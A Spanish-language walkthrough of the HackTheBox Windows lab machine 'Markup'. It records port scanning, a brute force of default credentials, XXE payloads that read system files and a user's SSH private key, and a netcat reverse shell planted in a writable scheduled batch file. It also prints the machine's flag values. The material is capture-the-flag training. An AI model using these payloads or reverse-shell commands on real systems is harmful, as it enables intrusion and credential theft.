# Markup

Plataforma: HackTheBox
OS: Windows
Level: Very Easy
Status: Done
Complete: Yes
Created time: 12 de enero de 2025 15:34
IP: 10.129.95.192

## Recopilación de información

<aside>
💡

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
❯ sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.95.192 -oG allports

PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 127
80/tcp  open  http    syn-ack ttl 127
443/tcp open  https   syn-ack ttl 127

```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p22,80,443 -sCV 10.129.95.192 -oN targeted

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaShopping
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_ssl-date: TLS randomness does not represent time
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaShopping
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
```

- **Identificación de vulnerabilidades**
    - 22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
    - 80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
    - 443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)

- **Enumeracion web**
    
    
    whatweb
    
    ```bash
    whatweb 10.129.95.192
    http://10.129.95.192 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28], IP[10.129.95.192], OpenSSL[1.1.1c], PHP[7.2.28], PasswordField[password], PoweredBy[Megacorp], Script, Title[MegaShopping], X-Powered-By[PHP/7.2.28]
    
    ```
    
    ![image.png](<imagenes/image 90.png>)
    
    Encontramos un panel de login. Buscamos credenciales por defecto con Burpsuite
    
    Capturamos petición y mandamos al Intruder. Una vez alli, configuramos el tipo de ataque “Cluster Bomb” para que combine los dos campos. 
    
    El payload 1 y dos para usuario y password respectivamente. Usamos diccionarios de Seclist
    
    ![image.png](<imagenes/image 91.png>)
    
    Ejecumaos ataque y obtenemos que la combinación “admin” y “password” nos dan un tamaño diferente y un codigo 200
    
    ![image.png](<imagenes/image 92.png>)
    
    Accedemos a la web con estas credenciales
    
    ![image.png](<imagenes/image 93.png>)
    
    Vemos el apartado “Order” para hacer pedidos y vamos a probar diferenes opciones
    

## Explotación

<aside>
💡

</aside>

### Explotación 1

Siguiendo las instrucciones de la maquina, miramos de encontar un XXE.

Capturamos una peticion en Order y cambiamos payload para XXE

![image.png](<imagenes/image 94.png>)

Le ponemos nombre “exploit” y el triger es xxe

Luego, probamos en los 3 campos y vemos que es el Item el que ejecuta el payload

Para una maquina linux seria:

```php
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE exploit [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```

Y para windows:

```php
<?xml version = "1.0"?>
<!DOCTYPE exploit [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'> ]>
<order>
	<quantity>
			4
	</quantity>
	<item>
			&xxe;
	</item>
	<address>
			avenu
	</address>
</order>
```

Aprovechando el xxe intentamos listar ficheros importantes.

Como en la web hemos enumerado en el Codigo HTML el usuario Daniel, intentamos obtener la id_rsa de este usuario

![image.png](<imagenes/image 95.png>)

```php
<!DOCTYPE exploit [<!ENTITY xxe SYSTEM 'file:///c:/users/Daniel/.ssh/id_rsa'> ]>
```

Obtenemos el fichero:

![image.png](<imagenes/image 96.png>)

Intentamos conectar por ssh

```php
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa daniel@10.129.95.192

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

daniel@MARKUP C:\Users\daniel>

daniel@MARKUP C:\Users\daniel\Desktop>type user.txt
032d2fc8952a8c24e39c8f0ee9918ef7       
```

User flag: 032d2fc8952a8c24e39c8f0ee9918ef7

## Escalada de privilegios

Vemos que en la carpeta indicada hay el bat : job.bat

```bash
daniel@MARKUP C:\Log-Management>type job.bat
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit

```

Buscamos que es “wevtutil.exe”

```html
Wevtutil.exe es una utilidad de línea de comandos de administrador que se utiliza principalmente para registrar el proveedor de eventos en el equipo. Proporciona información de metadatos sobre el proveedor, sus eventos y los canales en los que registra eventos, y para consultar eventos desde un canal o archivo de registro. Esta búsqueda busca wevtutil.exe con parámetros para borrar los registros de eventos de la aplicación, la seguridad, la configuración o el sistema, que pueden ser utilizados por los autores de ransomware en preparación para un ataque o durante este.
```

Vemos que este proceso se ejecuta en la maquina victima:

![image.png](<imagenes/image 97.png>)

Miramos que permisos tiene el bat:

```html
daniel@MARKUP c:\Log-Management>icacls job.bat
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

```

Permisos 

```php
	   			  - Permisos simples

								N - no access
                F - full access
                M - modify access
                RX - read and execute access
                R - read-only access
                W - write-only access
                D - delete access
                
            - Permisos especiales
            
                DE - delete
                RC - read control
                WDAC - write DAC
                WO - write owner
                S - synchronize
                AS - access system security
                MA - maximum allowed
                GR - generic read
                GW - generic write
                GE - generic execute
                GA - generic all
                RD - read data/list directory
                WD - write data/add file
                AD - append data/add subdirectory
                REA - read extended attributes
                WEA - write extended attributes
                X - execute/traverse
                DC - delete child
                RA - read attributes
                WA - write attributes
                
            - PErmisos herdados
            
		            (OI) - object inherit
                (CI) - container inherit
                (IO) - inherit only
                (NP) - don't propagate inherit
                (I) - permission inherited from parent container

					
       
```

La manera de escalar privilegios es, aprovechando que el script puede modificarse, emitir una rever shell a nuestro equipo con permisos de administrador

Para ello descargamos el netcat para la maquina victima y lo compartimos con python desde la nuestra

```bash
# Nuestra maquina
wget https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe
❯ python3 -m http.server 8000

#Maquina victima : 
# Desde powershell obtenemos el ejecutable de netcat de nuestra maquina

PS C:\Log-Management> wget http://10.10.16.103/nc64.exe -outfile nc.exe

# Modificamos el contenido para crear la rever. Con esto le decimos que dentro sustitya el contenido de job.bat por la revershell con permsios de admin (-e)

daniel@MARKUP c:\Log-Management>echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.103 4444 > C:\Log-Management\job.bat

# Nos ponemos en escucha en nustra maquina

sudo nc -lvnp 4444

# Esperamos un tiempo a que se ejecue en la maquina victima y obtenemos la rever 

listening on [any] 4444 ...
connect to [10.10.16.103] from (UNKNOWN) [10.129.95.192] 49684
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BA76-B4E3

 Directory of C:\Users\Administrator\Desktop

03/05/2020  06:33 AM    <DIR>          .
03/05/2020  06:33 AM    <DIR>          ..
03/05/2020  06:33 AM                70 root.txt
               1 File(s)             70 bytes
               2 Dir(s)   7,374,331,904 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
f574a3e7650cebd8c39784299cb570f8

```

## Conclusión

<aside>
💡 Maquina que me ha resultado dificil por ser de las primeras on windows. He aprendido sobre privesc en windows.

</aside>